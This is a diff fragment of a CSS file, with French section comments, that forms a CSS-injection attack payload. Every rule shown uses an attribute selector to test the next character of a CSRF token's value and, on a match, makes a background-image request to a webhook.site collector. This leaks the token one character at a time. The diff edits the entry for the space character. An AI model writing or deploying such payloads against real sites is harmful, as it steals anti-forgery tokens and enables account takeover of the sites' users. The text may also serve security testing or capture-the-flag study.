@@ -67,7 +67,7 @@ input.csrf[value^="ruW-tjL1BWCdhbiOSCA8=VEsDrT9"] { background: url("https://web
 /* ========================================================== */
 
 /* -------- Espace et ponctuation -------- */
-input.csrf[value^="ruW-tjL1BWCdhbiOSCA8=VEsDrT "] { background: url("https://webhook.site/bec3370e-7a49-4e2d-9107-2021e28de314?28=space"); }
+input.csrf[value^="ruW-tjL1BWCdhbiOSCA8=VEsDrT "] { background: url("https://webhook.site/bec3370e-7a49-4e2d-9107-2021e28de314?28= "); }
 input.csrf[value^="ruW-tjL1BWCdhbiOSCA8=VEsDrT!"] { background: url("https://webhook.site/bec3370e-7a49-4e2d-9107-2021e28de314?28=!"); }
 input.csrf[value^="ruW-tjL1BWCdhbiOSCA8=VEsDrT\""] { background: url("https://webhook.site/bec3370e-7a49-4e2d-9107-2021e28de314?28=\""); }
 input.csrf[value^="ruW-tjL1BWCdhbiOSCA8=VEsDrT#"] { background: url("https://webhook.site/bec3370e-7a49-4e2d-9107-2021e28de314?28=#"); }
